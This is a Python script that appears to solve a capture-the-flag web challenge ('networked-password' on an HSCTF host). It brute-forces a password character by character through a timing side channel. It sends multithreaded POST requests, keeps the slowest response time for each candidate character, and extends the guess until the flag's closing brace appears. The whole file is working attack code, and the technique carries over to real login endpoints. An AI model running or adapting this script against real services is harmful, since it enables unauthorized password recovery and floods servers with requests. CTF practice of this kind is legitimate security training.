#!/usr/bin/env python3
from multiprocessing.pool import ThreadPool
import requests
import string
import time
import operator

def attempt(password):
    start_time = time.time()

    url = 'https://networked-password.web.chal.hsctf.com/'
    data = {"password": password}
    res = requests.post(url, data=data)

    elapsed_time = time.time() - start_time

    return (password, round(elapsed_time, 2))

def avg_attempt(password):
    # Get the minimum time of 3 attempts
    # to make sure we don't have false triggers
    # due to timeout requests
    pwd, elapsed0 = attempt(password)
    pwd, elapsed1 = attempt(password)
    pwd, elapsed2 = attempt(password)
    return (password, min([elapsed0, elapsed1, elapsed2]))

charset = string.ascii_letters + string.digits + string.punctuation

def main():
    pool = ThreadPool(processes=25)

    # bruteforce all chars
    progress = 'hsc'
    while '}' not in progress:
        try:
            # multithreaded: call attempt(progress + ch)
            async_results = []
            for ch in charset:
                async_result = pool.apply_async(avg_attempt, (progress + ch,))
                async_results.append(async_result)

            # collect data results
            collected = dict()
            for async_result in async_results:
                a, b = async_result.get()
                collected[a] = b

            # get key with max value
            progress = max(collected.items(), key=operator.itemgetter(1))[0]
            print("progress:", progress, collected[progress])
        except:
            print('Retry', progress)

if __name__ == '__main__':
    main()
